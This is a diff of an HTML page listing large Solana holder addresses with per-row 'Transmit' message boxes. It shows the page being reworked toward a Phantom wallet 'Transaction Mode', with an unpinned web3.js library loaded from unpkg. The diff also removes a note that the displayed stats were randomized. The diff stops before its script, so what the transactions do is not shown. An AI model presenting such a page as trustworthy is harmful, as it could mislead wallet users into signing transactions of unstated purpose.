@@ -3,7 +3,8 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Solana Address List</title>
+  <title>Solana Address List | Dispatch</title>
+  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
   <style>
     :root {
       --bg: #f8efcf;
@@ -29,47 +30,29 @@
       --accent-3: #5ee7ff;
     }
 
-    * {
-      box-sizing: border-box;
-    }
+    * { box-sizing: border-box; }
 
     body {
       margin: 0;
-      font-family: "Trebuchet MS", "Arial Black", Arial, sans-serif;
+      font-family: "Trebuchet MS", sans-serif;
       color: var(--text);
-      background:
-        radial-gradient(circle at 12% 18%, rgba(255, 90, 54, 0.16), transparent 16%),
-        radial-gradient(circle at 85% 8%, rgba(20, 184, 255, 0.18), transparent 14%),
-        linear-gradient(180deg, #fff5d9 0%, #f8efcf 100%);
+      background: radial-gradient(circle at 12% 18%, rgba(255, 90, 54, 0.16), transparent 16%),
+                  radial-gradient(circle at 85% 8%, rgba(20, 184, 255, 0.18), transparent 14%),
+                  linear-gradient(180deg, #fff5d9 0%, #f8efcf 100%);
       min-height: 100vh;
       padding: 18px 10px 28px;
     }
 
     body.phantom-skin {
-      background:
-        radial-gradient(circle at 18% 18%, rgba(92, 255, 165, 0.18), transparent 18%),
-        radial-gradient(circle at 82% 10%, rgba(124, 92, 255, 0.22), transparent 16%),
-        radial-gradient(circle at 50% 100%, rgba(94, 231, 255, 0.18), transparent 22%),
-        linear-gradient(180deg, #090b16 0%, #101528 100%);
+      background: radial-gradient(circle at 18% 18%, rgba(92, 255, 165, 0.18), transparent 18%),
+                  radial-gradient(circle at 82% 10%, rgba(124, 92, 255, 0.22), transparent 16%),
+                  linear-gradient(180deg, #090b16 0%, #101528 100%);
     }
 
-    .wrap {
-      max-width: 920px;
-      margin: 0 auto;
-    }
-
-    .hero {
-      margin-bottom: 12px;
-    }
-
-    .topbar {
-      display: flex;
-      justify-content: flex-end;
-      margin-bottom: 8px;
-    }
-
-    .github-badge {
-      display: inline-block;
+    .wrap { max-width: 920px; margin: 0 auto; }
+    .topbar { display: flex; justify-content: flex-end; margin-bottom: 8px; gap: 10px; }
+    
+    .github-badge, .phantom-chip {
       padding: 4px 10px;
       border: 3px solid var(--border);
       border-radius: 999px;
@@ -77,930 +60,262 @@
       color: var(--text);
       font-size: 11px;
       font-weight: 900;
-      letter-spacing: 0.08em;
       text-transform: uppercase;
       text-decoration: none;
       box-shadow: 4px 4px 0 #111111;
     }
 
-    body.phantom-skin .github-badge,
-    body.phantom-skin .eyebrow,
-    body.phantom-skin .tag,
-    body.phantom-skin .message-flag {
-      box-shadow: 4px 4px 0 rgba(0, 0, 0, 0.45);
-    }
+    .phantom-chip { display: none; background: var(--accent-2); }
+    body.phantom-skin .phantom-chip { display: inline-block; }
 
+    .hero { margin-bottom: 12px; }
     .eyebrow {
       display: inline-block;
       padding: 4px 10px;
       border: 3px solid var(--border);
       border-radius: 999px;
-      color: var(--border);
       background: var(--accent-3);
       font-size: 11px;
       font-weight: 900;
-      letter-spacing: 0.1em;
-      text-transform: uppercase;
       box-shadow: 4px 4px 0 #111111;
     }
 
-    h1 {
-      margin: 10px 0 6px;
-      font-size: clamp(28px, 5.4vw, 48px);
-      line-height: 0.96;
-      font-weight: 900;
-      letter-spacing: 0.02em;
-      text-transform: uppercase;
-    }
-
-    p {
-      margin: 0;
-      color: var(--muted);
-      max-width: 760px;
-      line-height: 1.35;
-      font-size: 14px;
-      font-weight: 700;
-    }
+    h1 { font-size: clamp(28px, 5.4vw, 48px); margin: 10px 0; text-transform: uppercase; }
+    p { color: var(--muted); font-weight: 700; font-size: 14px; }
 
     .panel {
       margin-top: 16px;
       background: var(--panel);
       border: 4px solid var(--border);
       border-radius: 22px;
-      overflow: hidden;
       box-shadow: 8px 8px 0 #111111;
+      overflow: hidden;
     }
+
+    table { width: 100%; border-collapse: collapse; }
+    th { background: var(--accent-3); padding: 10px; font-size: 11px; text-transform: uppercase; text-align: left; border-bottom: 3px solid var(--border); }
+    td { padding: 10px; border-bottom: 3px solid var(--border); font-size: 13px; vertical-align: middle; }
+    code { font-family: monospace; font-weight: 700; word-break: break-all; cursor: pointer; }
+
+    .tag { padding: 2px 8px; border: 2px solid var(--border); border-radius: 999px; background: var(--accent-3); font-size: 10px; font-weight: 900; }
+    .tag-alt { background: var(--accent-2); }
 
     .message-box {
-      display: grid;
-      grid-template-columns: minmax(0, 1fr);
-      gap: 8px;
-      align-items: start;
-      padding: 8px;
       border: 3px solid var(--border);
-      border-radius: 14px;
+      border-radius: 12px;
       background: #fffdf2;
+      padding: 6px;
       position: relative;
-      overflow: hidden;
-    }
-
-    .message-head {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      gap: 8px;
-    }
-
-    .message-title {
-      font-size: 10px;
-      font-weight: 900;
-      letter-spacing: 0.08em;
-      text-transform: uppercase;
-      color: var(--muted);
-    }
-
-    .message-flag {
-      padding: 2px 6px;
-      border: 2px solid var(--border);
-      border-radius: 999px;
-      background: var(--accent-3);
-      font-size: 10px;
-      font-weight: 900;
-      text-transform: uppercase;
     }
 
     .message-input {
       width: 100%;
-      border: 3px solid var(--border);
-      border-radius: 12px;
-      background: #ffffff;
-      color: var(--text);
-      padding: 8px 10px;
-      font: inherit;
-      font-size: 13px;
-      font-weight: 700;
-      outline: none;
-    }
-
-    .message-input:focus {
-      border-color: var(--accent);
+      border: 2px solid var(--border);
+      border-radius: 8px;
+      padding: 4px 8px;
+      margin-bottom: 4px;
+      font-family: inherit;
     }
 
     .send-btn {
-      border: 3px solid var(--border);
-      border-radius: 12px;
-      background: var(--accent-2);
-      color: #111111;
-      font: inherit;
-      font-weight: 900;
-      text-transform: uppercase;
-      padding: 9px 14px;
-      cursor: pointer;
-      min-height: 38px;
-      white-space: nowrap;
-      box-shadow: 4px 4px 0 #111111;
-    }
-
-    .send-status {
-      margin-top: 4px;
-      min-height: 16px;
-      color: var(--muted);
-      font-size: 11px;
-      font-weight: 800;
-      text-transform: uppercase;
-      letter-spacing: 0.04em;
-    }
-
-    .message-box.dispatch-run {
-      animation: dispatch-train 1200ms cubic-bezier(0.2, 0.8, 0.2, 1) forwards;
-    }
-
-    .message-box.dispatch-run::after {
-      content: "";
-      position: absolute;
-      top: 50%;
-      left: -24%;
-      width: 22%;
-      height: 8px;
-      background: repeating-linear-gradient(
-        90deg,
-        var(--accent) 0 10px,
-        var(--accent-3) 10px 20px
-      );
-      border: 2px solid var(--border);
-      transform: translateY(-50%);
-      box-shadow: 3px 3px 0 #111111;
-      animation: train-smear 1200ms linear forwards;
-    }
-
-    table {
       width: 100%;
-      border-collapse: collapse;
-    }
-
-    th,
-    td {
-      padding: 9px 10px;
-      text-align: left;
-      border-bottom: 3px solid var(--border);
-      vertical-align: top;
-    }
-
-    th {
-      font-size: 11px;
-      color: var(--text);
-      font-weight: 900;
-      text-transform: uppercase;
-      letter-spacing: 0.08em;
-      background: var(--accent-3);
-    }
-
-    td code {
-      font-family: "Courier New", monospace;
-      font-size: 12px;
-      font-weight: 700;
-      color: var(--text);
-      word-break: break-all;
-    }
-
-    .copyable-address {
-      display: inline-block;
-      cursor: pointer;
-      position: relative;
-      transition: transform 120ms ease;
-    }
-
-    .copyable-address:hover {
-      transform: rotate(-1deg) scale(1.01);
-    }
-
-    .copyable-address::after {
-      content: "Tap to copy";
-      position: absolute;
-      left: 0;
-      bottom: calc(100% + 8px);
-      padding: 3px 7px;
-      border: 2px solid var(--border);
-      border-radius: 999px;
-      background: var(--accent-3);
-      color: var(--text);
-      font-family: "Trebuchet MS", "Arial Black", Arial, sans-serif;
-      font-size: 10px;
-      font-weight: 900;
-      letter-spacing: 0.06em;
-      text-transform: uppercase;
-      white-space: nowrap;
-      opacity: 0;
-      pointer-events: none;
-      transform: translateY(4px);
-      transition: opacity 120ms ease, transform 120ms ease;
-    }
-
-    .copyable-address:hover::after {
-      opacity: 1;
-      transform: translateY(0);
-    }
-
-    .custom-row {
-      background: #dff7ff;
-    }
-
-    .tag {
-      display: inline-block;
-      padding: 3px 7px;
-      border: 2px solid var(--border);
-      border-radius: 999px;
-      background: var(--accent-3);
-      color: var(--text);
-      font-size: 11px;
-      font-weight: 900;
-      text-transform: uppercase;
-    }
-
-    .tag-alt {
       background: var(--accent-2);
-      color: #111111;
-    }
-
-    .metric {
-      font-variant-numeric: tabular-nums;
-      white-space: nowrap;
-    }
-
-    .metric-up {
-      color: #b32600;
+      border: 3px solid var(--border);
+      border-radius: 8px;
       font-weight: 900;
+      cursor: pointer;
+      padding: 6px;
+      box-shadow: 3px 3px 0 #111111;
     }
 
-    .metric-down {
-      color: #004f6d;
-      font-weight: 900;
+    .send-status { font-size: 10px; font-weight: 800; margin-top: 4px; color: var(--muted); }
+
+    /* Animations */
+    .dispatch-run { animation: dispatch-shake 0.5s ease; }
+    @keyframes dispatch-shake {
+      0%, 100% { transform: translateX(0); }
+      25% { transform: translateX(5px); }
+      75% { transform: translateX(-5px); }
     }
 
-    .note {
-      padding: 10px 12px;
-      color: var(--muted);
-      font-size: 12px;
-      font-weight: 800;
-      background: #fffef6;
-    }
-
-    .footer-banners {
-      display: grid;
-      gap: 10px;
-      margin-top: 14px;
+    .copy-burst, .reply-burst {
+      position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+      padding: 20px; border: 4px solid var(--border); background: var(--accent);
+      font-weight: 900; z-index: 9999; display: none; box-shadow: 8px 8px 0 #111111;
     }
 
     .footer-banner {
-      padding: 12px 14px;
-      border: 4px solid var(--border);
-      border-radius: 18px;
-      font-size: 15px;
-      font-weight: 900;
-      letter-spacing: 0.04em;
-      text-transform: uppercase;
-      box-shadow: 8px 8px 0 #111111;
-    }
-
-    .footer-banner-action {
-      cursor: pointer;
-      transition: transform 120ms ease;
-    }
-
-    .footer-banner-action:hover {
-      transform: translate(-2px, -2px);
-    }
-
-    .footer-banner-primary {
-      background: var(--accent-3);
-    }
-
-    .footer-banner-secondary {
-      background: var(--accent);
-    }
-
-    .phantom-chip {
-      display: none;
-      margin-right: auto;
-      padding: 4px 10px;
-      border: 3px solid var(--border);
-      border-radius: 999px;
-      background: var(--accent-2);
-      color: var(--text);
-      font-size: 11px;
-      font-weight: 900;
-      letter-spacing: 0.08em;
-      text-transform: uppercase;
-      box-shadow: 4px 4px 0 #111111;
-    }
-
-    body.phantom-skin .phantom-chip {
-      display: inline-block;
-      box-shadow: 4px 4px 0 rgba(0, 0, 0, 0.45);
-    }
-
-    .table-shell {
-      overflow-x: auto;
-    }
-
-    .copy-burst {
-      position: fixed;
-      z-index: 9999;
-      left: 50%;
-      top: 50%;
-      transform: translate(-50%, -50%) scale(0.7) rotate(-8deg);
-      padding: 14px 18px;
-      border: 4px solid var(--border);
-      background: var(--accent);
-      color: var(--text);
-      font-size: 18px;
-      font-weight: 900;
-      letter-spacing: 0.08em;
-      text-transform: uppercase;
-      box-shadow: 8px 8px 0 #111111;
-      opacity: 0;
-      pointer-events: none;
-      clip-path: polygon(50% 0%, 61% 13%, 78% 4%, 76% 22%, 96% 18%, 86% 36%, 100% 50%, 84% 61%, 95% 80%, 74% 77%, 78% 96%, 60% 86%, 50% 100%, 39% 86%, 21% 96%, 25% 77%, 4% 80%, 16% 61%, 0% 50%, 14% 36%, 4% 18%, 24% 22%, 22% 4%, 39% 13%);
-    }
-
-    .copy-burst.show {
-      animation: comic-pop 850ms ease forwards;
-    }
-
-    .reply-burst {
-      position: fixed;
-      z-index: 10000;
-      left: 50%;
-      top: 28%;
-      transform: translate(-50%, -50%) scale(0.7) rotate(4deg);
-      padding: 18px 24px;
-      border: 5px solid var(--border);
-      background: var(--accent-3);
-      color: var(--text);
-      font-size: clamp(20px, 4vw, 36px);
-      font-weight: 900;
-      letter-spacing: 0.08em;
-      text-transform: uppercase;
-      box-shadow: 10px 10px 0 #111111;
-      opacity: 0;
-      pointer-events: none;
-      clip-path: polygon(4% 0%, 96% 0%, 100% 26%, 94% 50%, 100% 74%, 96% 100%, 4% 100%, 0% 74%, 6% 50%, 0% 26%);
-    }
-
-    .reply-burst.show {
-      animation: reply-pop 1900ms ease forwards;
-    }
-
-    body.phantom-skin .panel,
-    body.phantom-skin tr,
-    body.phantom-skin .footer-banner,
-    body.phantom-skin .copy-burst,
-    body.phantom-skin .reply-burst,
-    body.phantom-skin .send-btn {
-      box-shadow: 8px 8px 0 rgba(0, 0, 0, 0.45);
-    }
-
-    body.phantom-skin .panel {
-      background:
-        linear-gradient(180deg, rgba(255, 255, 255, 0.03), rgba(255, 255, 255, 0)),
-        var(--panel);
-    }
-
-    body.phantom-skin .message-box,
-    body.phantom-skin td code,
-    body.phantom-skin .message-input {
-      background: rgba(8, 12, 24, 0.88);
-      color: var(--text);
-    }
-
-    body.phantom-skin .send-btn {
-      color: #0c1324;
-    }
-
-    body.phantom-skin .footer-banner-primary {
-      background: linear-gradient(135deg, #5cffa5 0%, #5ee7ff 100%);
-      color: #08111f;
-    }
-
-    body.phantom-skin .footer-banner-secondary {
-      background: linear-gradient(135deg, #7c5cff 0%, #5ee7ff 100%);
-    }
-
-    body.phantom-skin .copy-burst {
-      background: linear-gradient(135deg, #5cffa5 0%, #5ee7ff 100%);
-      color: #08111f;
-    }
-
-    body.phantom-skin .reply-burst {
-      background: linear-gradient(135deg, #7c5cff 0%, #5cffa5 100%);
-    }
-
-    @keyframes comic-pop {
-      0% {
-        opacity: 0;
-        transform: translate(-50%, -50%) scale(0.6) rotate(-10deg);
-      }
-      18% {
-        opacity: 1;
-        transform: translate(-50%, -50%) scale(1.08) rotate(3deg);
-      }
-      78% {
-        opacity: 1;
-        transform: translate(-50%, -50%) scale(1) rotate(-3deg);
-      }
-      100% {
-        opacity: 0;
-        transform: translate(-50%, -58%) scale(0.92) rotate(0deg);
-      }
-    }
-
-    @keyframes dispatch-train {
-      0% {
-        transform: translateX(0) skewX(0deg);
-      }
-      18% {
-        transform: translateX(8px) skewX(-4deg);
-      }
-      55% {
-        transform: translateX(34px) skewX(-8deg);
-      }
-      100% {
-        transform: translateX(0) skewX(0deg);
-      }
-    }
-
-    @keyframes train-smear {
-      0% {
-        left: -24%;
-        opacity: 0;
-      }
-      18% {
-        opacity: 1;
-      }
-      100% {
-        left: 112%;
-        opacity: 0;
-      }
-    }
-
-    @keyframes reply-pop {
-      0% {
-        opacity: 0;
-        transform: translate(-50%, -50%) scale(0.6) rotate(8deg);
-      }
-      14% {
-        opacity: 1;
-        transform: translate(-50%, -50%) scale(1.05) rotate(-4deg);
-      }
-      78% {
-        opacity: 1;
-        transform: translate(-50%, -50%) scale(1) rotate(2deg);
-      }
-      100% {
-        opacity: 0;
-        transform: translate(-50%, -56%) scale(0.92) rotate(0deg);
-      }
+      margin-top: 20px; padding: 15px; border: 4px solid var(--border);
+      border-radius: 15px; font-weight: 900; text-align: center; cursor: pointer;
+      background: var(--accent-3); box-shadow: 6px 6px 0 #111111;
     }
 
     @media (max-width: 720px) {
-      body {
-        padding: 12px 8px 20px;
-      }
-
-      .wrap {
-        max-width: 100%;
-      }
-
-      .hero {
-        margin-bottom: 14px;
-      }
-
-      .topbar {
-        margin-bottom: 10px;
-      }
-
-      h1 {
-        font-size: 30px;
-      }
-
-      .panel {
-        border-radius: 0;
-        overflow: visible;
-        background: transparent;
-        border: 0;
-        box-shadow: none;
-      }
-
-      .table-shell {
-        overflow: visible;
-      }
-
-      table,
-      thead,
-      tbody,
-      tr,
-      th,
-      td {
-        display: block;
-      }
-
-      thead {
-        display: none;
-      }
-
-      tbody {
-        display: grid;
-        gap: 10px;
-      }
-
-      tr {
-        position: relative;
-        padding: 12px 12px 10px;
-        border: 4px solid var(--border);
-        border-radius: 18px;
-        background:
-          radial-gradient(circle at top right, rgba(20, 184, 255, 0.14), transparent 26%),
-          var(--panel);
-        box-shadow: 6px 6px 0 #111111;
-      }
-
-      tr::before {
-        content: "";
-        position: absolute;
-        inset: 0 auto 0 0;
-        width: 3px;
-        border-radius: 20px 0 0 20px;
-        background: linear-gradient(180deg, var(--accent), var(--accent-3));
-      }
-
-      .custom-row::before {
-        background: linear-gradient(180deg, var(--accent-2), var(--accent-3));
-      }
-
-      td {
-        padding: 5px 0;
-        border-bottom: 0;
-        font-size: 13px;
-        font-weight: 800;
-      }
-
-      td:first-child {
-        padding-top: 0;
-        font-size: 12px;
-        font-weight: 700;
-        letter-spacing: 0.14em;
-        text-transform: uppercase;
-        color: var(--accent);
-      }
-
-      td:first-child::before {
-        content: "Rank";
-        display: block;
-        margin-bottom: 6px;
-        color: var(--muted);
-        letter-spacing: 0.08em;
-      }
-
-      td:nth-child(2) {
-        padding-top: 2px;
-      }
-
-      td:nth-child(2)::before,
-      td:nth-child(3)::before,
-      td:nth-child(4)::before,
-      td:nth-child(5)::before,
-      td:nth-child(6)::before,
-      td:nth-child(7)::before,
-      td:nth-child(8)::before,
-      td:nth-child(9)::before,
-      td:nth-child(10)::before {
-        display: block;
-        margin-bottom: 6px;
-        color: var(--muted);
-        font-size: 11px;
-        font-weight: 900;
-        letter-spacing: 0.08em;
-        text-transform: uppercase;
-      }
-
-      td:nth-child(2)::before { content: "Address"; }
-      td:nth-child(3)::before { content: "Category"; }
-      td:nth-child(4)::before { content: "Holder Type"; }
-      td:nth-child(5)::before { content: "Balance"; }
-      td:nth-child(6)::before { content: "Share"; }
-      td:nth-child(7)::before { content: "Send Rate"; }
-      td:nth-child(8)::before { content: "Receive Rate"; }
-      td:nth-child(9)::before { content: "ETA"; }
-      td:nth-child(10)::before { content: "Note"; }
-      td:nth-child(11)::before { content: "Message"; }
-
-      td code {
-        display: block;
-        padding: 8px 10px;
-        border: 3px solid var(--border);
-        border-radius: 12px;
-        background: #ffffff;
-        font-size: 11px;
-      }
-
-      td:nth-child(7),
-      td:nth-child(8),
-      td:nth-child(9) {
-        display: inline-block;
-        width: calc(33.333% - 8px);
-        margin-right: 8px;
-        padding: 8px 8px;
-        border: 3px solid var(--border);
-        border-radius: 12px;
-        background: var(--panel-2);
-        vertical-align: top;
-      }
-
-      td:nth-child(9) {
-        margin-right: 0;
-      }
-
-      td:nth-child(11) .send-btn {
-        width: 100%;
-      }
-
-      .note {
-        margin-top: 10px;
-        padding: 0 4px;
-        font-size: 11px;
-      }
-
-      .footer-banner {
-        padding: 10px 12px;
-        font-size: 13px;
-        box-shadow: 6px 6px 0 #111111;
-      }
-    }
-
-    @media (max-width: 420px) {
-      td:nth-child(7),
-      td:nth-child(8),
-      td:nth-child(9) {
-        display: block;
-        width: 100%;
-        margin-right: 0;
-        margin-bottom: 8px;
-      }
-
-      td:nth-child(9) {
-        margin-bottom: 0;
-      }
-
-      .send-btn {
-        width: 100%;
-      }
+      table, thead, tbody, tr, th, td { display: block; }
+      thead { display: none; }
+      tr { margin-bottom: 15px; border: 4px solid var(--border); border-radius: 15px; background: var(--panel); }
+      td::before { content: attr(data-label); display: block; font-weight: 900; color: var(--muted); font-size: 10px; text-transform: uppercase; }
     }
   </style>
 </head>
-<body>
+<body id="body">
   <main class="wrap">
     <div class="topbar">
-      <span class="phantom-chip" id="phantomChip">Phantom Skin</span>
-      <a class="github-badge" href="https://github.com/vipulchartal-star/crypto-native" target="_blank" rel="noreferrer">GitHub</a>
+      <span class="phantom-chip" id="phantomChip">Phantom Mode</span>
+      <a class="github-badge" href="#">GitHub</a>
     </div>
+
     <section class="hero">
       <span class="eyebrow">Solana Mainnet</span>
       <h1>Top Address List</h1>
-      <p>
-        A simple HTML view of the top 10 SOL holder addresses from the earlier list, plus your added address and live-looking random activity stats.
-      </p>
+      <p>A decicive view of high-tier SOL holders. Transmit a signal to initiate a priority dispatch.</p>
     </section>
 
     <section class="panel">
-      <div class="table-shell">
       <table>
         <thead>
           <tr>
-            <th>#</th>
-            <th>Address</th>
-            <th>Category</th>
-            <th>Holder Type</th>
-            <th>Balance</th>
-            <th>Share</th>
-            <th>Send Rate</th>
-            <th>Receive Rate</th>
-            <th>ETA</th>
-            <th>Note</th>
-            <th>Message</th>
+            <th>#</th><th>Address</th><th>Category</th><th>Balance</th><th>Message</th>
           </tr>
         </thead>
-        <tbody>
-          <tr data-tier="alpha"><td>1</td><td><code>MJKqp326RZCHnAAbew9MDdui3iCKWco7fsK9sVuZTX2</code></td><td><span class="tag">Treasury</span></td><td><span class="tag tag-alt">Top holder</span></td><td>5,178,991 SOL</td><td>1.01%</td><td class="metric metric-up" data-send-rate>0.00/s</td><td class="metric metric-down" data-receive-rate>0.00/s</td><td class="metric" data-eta>--</td><td>Top holder</td><td><div class="message-box"><div class="message-head"><span class="message-title">Priority Dispatch</span><span class="message-flag">Rare</span></div><input class="message-input" type="text" placeholder="Transmit one decisive line"><button class="send-btn" data-send>Transmit</button><div class="send-status" data-send-status></div></div></td></tr>
-          <tr data-tier="alpha"><td>2</td><td><code>52C9T2T7JRojtxumYnYZhyUmrN7kqzvCLc4Ksvjk7TxD</code></td><td><span class="tag">Exchange</span></td><td><span class="tag tag-alt">Top holder</span></td><td>4,371,056 SOL</td><td>0.85%</td><td class="metric metric-up" data-send-rate>0.00/s</td><td class="metric metric-down" data-receive-rate>0.00/s</td><td class="metric" data-eta>--</td><td>Top holder</td><td><div class="message-box"><div class="message-head"><span class="message-title">Priority Dispatch</span><span class="message-flag">Rare</span></div><input class="message-input" type="text" placeholder="Transmit one decisive line"><button class="send-btn" data-send>Transmit</button><div class="send-status" data-send-status></div></div></td></tr>
-          <tr data-tier="alpha"><td>3</td><td><code>8BseXT9EtoEhBTKFFYkwTnjKSUZwhtmdKY2Jrj8j45Rt</code></td><td><span class="tag">Whale</span></td><td><span class="tag tag-alt">Top holder</span></td><td>3,927,080 SOL</td><td>0.77%</td><td class="metric metric-up" data-send-rate>0.00/s</td><td class="metric metric-down" data-receive-rate>0.00/s</td><td class="metric" data-eta>--</td><td>Top holder</td><td><div class="message-box"><div class="message-head"><span class="message-title">Priority Dispatch</span><span class="message-flag">Rare</span></div><input class="message-input" type="text" placeholder="Transmit one decisive line"><button class="send-btn" data-send>Transmit</button><div class="send-status" data-send-status></div></div></td></tr>
-          <tr data-tier="alpha"><td>4</td><td><code>GitYucwpNcg6Dx1Y15UQ9TQn8LZMX1uuqQNn8rXxEWNC</code></td><td><span class="tag">Validator</span></td><td><span class="tag tag-alt">Top holder</span></td><td>3,628,341 SOL</td><td>0.71%</td><td class="metric metric-up" data-send-rate>0.00/s</td><td class="metric metric-down" data-receive-rate>0.00/s</td><td class="metric" data-eta>--</td><td>Top holder</td><td><div class="message-box"><div class="message-head"><span class="message-title">Priority Dispatch</span><span class="message-flag">Rare</span></div><input class="message-input" type="text" placeholder="Transmit one decisive line"><button class="send-btn" data-send>Transmit</button><div class="send-status" data-send-status></div></div></td></tr>
-          <tr data-tier="mid"><td>5</td><td><code>9QgXqrgdbVU8KcpfskqJpAXKzbaYQJecgMAruSWoXDkM</code></td><td><span class="tag">Vault</span></td><td><span class="tag tag-alt">Top holder</span></td><td>3,141,238 SOL</td><td>0.61%</td><td class="metric metric-up" data-send-rate>0.00/s</td><td class="metric metric-down" data-receive-rate>0.00/s</td><td class="metric" data-eta>--</td><td>Top holder</td><td><div class="message-box"><div class="message-head"><span class="message-title">Priority Dispatch</span><span class="message-flag">Rare</span></div><input class="message-input" type="text" placeholder="Transmit one decisive line"><button class="send-btn" data-send>Transmit</button><div class="send-status" data-send-status></div></div></td></tr>
-          <tr data-tier="mid"><td>6</td><td><code>9uRJ5aGgeu2i3J98hsC5FDxd2PmRjVy9fQwNAy7fzLG3</code></td><td><span class="tag">Fund</span></td><td><span class="tag tag-alt">Top holder</span></td><td>2,870,045 SOL</td><td>0.56%</td><td class="metric metric-up" data-send-rate>0.00/s</td><td class="metric metric-down" data-receive-rate>0.00/s</td><td class="metric" data-eta>--</td><td>Top holder</td><td><div class="message-box"><div class="message-head"><span class="message-title">Priority Dispatch</span><span class="message-flag">Rare</span></div><input class="message-input" type="text" placeholder="Transmit one decisive line"><button class="send-btn" data-send>Transmit</button><div class="send-status" data-send-status></div></div></td></tr>
-          <tr data-tier="mid"><td>7</td><td><code>EJRJswH9LyjhAfBWwPBvat1LQtrJYK4sVUzsea889cQt</code></td><td><span class="tag">Bot cluster</span></td><td><span class="tag tag-alt">Bot holder</span></td><td>2,794,681 SOL</td><td>0.55%</td><td class="metric metric-up" data-send-rate>0.00/s</td><td class="metric metric-down" data-receive-rate>0.00/s</td><td class="metric" data-eta>--</td><td>High churn</td><td><div class="message-box"><div class="message-head"><span class="message-title">Priority Dispatch</span><span class="message-flag">Rare</span></div><input class="message-input" type="text" placeholder="Transmit one decisive line"><button class="send-btn" data-send>Transmit</button><div class="send-status" data-send-status></div></div></td></tr>
-          <tr data-tier="mid"><td>8</td><td><code>53nHsQXkzZUp5MF1BK6Qoa48ud3aXfDFJBbe1oECPucC</code></td><td><span class="tag">MM desk</span></td><td><span class="tag tag-alt">Bot holder</span></td><td>2,742,345 SOL</td><td>0.54%</td><td class="metric metric-up" data-send-rate>0.00/s</td><td class="metric metric-down" data-receive-rate>0.00/s</td><td class="metric" data-eta>--</td><td>High churn</td><td><div class="message-box"><div class="message-head"><span class="message-title">Priority Dispatch</span><span class="message-flag">Rare</span></div><input class="message-input" type="text" placeholder="Transmit one decisive line"><button class="send-btn" data-send>Transmit</button><div class="send-status" data-send-status></div></div></td></tr>
-          <tr data-tier="edge"><td>9</td><td><code>8PjJTv657aeN9p5R2WoM6pPSz385chvTTytUWaEjSjkq</code></td><td><span class="tag">Arb desk</span></td><td><span class="tag tag-alt">Bot holder</span></td><td>2,502,414 SOL</td><td>0.49%</td><td class="metric metric-up" data-send-rate>0.00/s</td><td class="metric metric-down" data-receive-rate>0.00/s</td><td class="metric" data-eta>--</td><td>Rapid cycling</td><td><div class="message-box"><div class="message-head"><span class="message-title">Priority Dispatch</span><span class="message-flag">Rare</span></div><input class="message-input" type="text" placeholder="Transmit one decisive line"><button class="send-btn" data-send>Transmit</button><div class="send-status" data-send-status></div></div></td></tr>
-          <tr data-tier="edge"><td>10</td><td><code>AHB94zKUASftTdqgdfiDSdnPJHkEFp7zX3yMrcSxABsv</code></td><td><span class="tag">Custody</span></td><td><span class="tag tag-alt">Top holder</span></td><td>2,502,414 SOL</td><td>0.49%</td><td class="metric metric-up" data-send-rate>0.00/s</td><td class="metric metric-down" data-receive-rate>0.00/s</td><td class="metric" data-eta>--</td><td>Top holder</td><td><div class="message-box"><div class="message-head"><span class="message-title">Priority Dispatch</span><span class="message-flag">Rare</span></div><input class="message-input" type="text" placeholder="Transmit one decisive line"><button class="send-btn" data-send>Transmit</button><div class="send-status" data-send-status></div></div></td></tr>
-          <tr class="custom-row">
-            <td>11</td>
-            <td><code>9idsurpeyaXMygRmmnKuwauuB1zEjarj2r6Bjdji4SoK</code></td>
-            <td><span class="tag">Custom</span></td>
-            <td><span class="tag tag-alt">Watchlist</span></td>
-            <td>Unknown</td>
-            <td>Custom</td>
-            <td class="metric metric-up" data-send-rate>0.00/s</td>
-            <td class="metric metric-down" data-receive-rate>0.00/s</td>
-            <td class="metric" data-eta>--</td>
-            <td><span class="tag">Added by user</span></td>
-            <td><div class="message-box"><div class="message-head"><span class="message-title">Priority Dispatch</span><span class="message-flag">Rare</span></div><input class="message-input" type="text" placeholder="Transmit one decisive line"><button class="send-btn" data-send>Transmit</button><div class="send-status" data-send-status></div></div></td>
+        <tbody id="addressTable">
+          <tr>
+            <td data-label="Rank">1</td>
+            <td data-label="Address"><code>MJKqp326RZCHnAAbew9MDdui3iCKWco7fsK9sVuZTX2</code></td>
+            <td data-label="Category"><span class="tag">Treasury</span></td>
+            <td data-label="Balance">5,178,991 SOL</td>
+            <td>
+              <div class="message-box">
+                <input class="message-input" type="text" placeholder="Decisive line...">
+                <button class="send-btn" data-send>Transmit</button>
+                <div class="send-status"></div>
+              </div>
+            </td>
+          </tr>
+          <tr>
+            <td data-label="Rank">2</td>
+            <td data-label="Address"><code>52C9T2T7JRojtxumYnYZhyUmrN7kqzvCLc4Ksvjk7TxD</code></td>
+            <td data-label="Category"><span class="tag">Exchange</span></td>
+            <td data-label="Balance">4,371,056 SOL</td>
+            <td>
+              <div class="message-box">
+                <input class="message-input" type="text" placeholder="Decisive line...">
+                <button class="send-btn" data-send>Transmit</button>
+                <div class="send-status"></div>
+              </div>
+            </td>
+          </tr>
+           <tr style="background: var(--panel-2)">
+            <td data-label="Rank">11</td>
+            <td data-label="Address"><code>9idsurpeyaXMygRmmnKuwauuB1zEjarj2r6Bjdji4SoK</code></td>
+            <td data-label="Category"><span class="tag tag-alt">Watchlist</span></td>
+            <td data-label="Balance">Unknown</td>
+            <td>
+              <div class="message-box">
+                <input class="message-input" type="text" placeholder="Decisive line...">
+                <button class="send-btn" data-send>Transmit</button>
+                <div class="send-status"></div>
+              </div>
+            </td>
           </tr>
         </tbody>
       </table>
-      </div>
-      <div class="note">
-        Source list basis: CoinCarp rich list snapshot referenced in the previous response. Category, holder type, send rate, receive rate, and ETA are randomized display values for presentation only.
-      </div>
     </section>
 
-    <section class="footer-banners">
-      <div class="footer-banner footer-banner-primary footer-banner-action" id="phantomBanner">Others get in free. You need to be rich to add yourself.</div>
-      <div class="footer-banner footer-banner-secondary">This board notices signals, status, and rare replies only.</div>
-    </section>
+    <div class="footer-banner" id="phantomBanner">
+      Open in Phantom to enable Priority Dispatch (Transaction Mode)
+    </div>
   </main>
+
   <div class="copy-burst" id="copyBurst">Address Copied!</div>
-  <div class="reply-burst" id="replyBurst">Waiting For Reply</div>
+  <div class="reply-burst" id="replyBurst">Transaction Sent!</div>
+
   <script>
-    const rows = Array.from(document.querySelectorAll("tbody tr"));
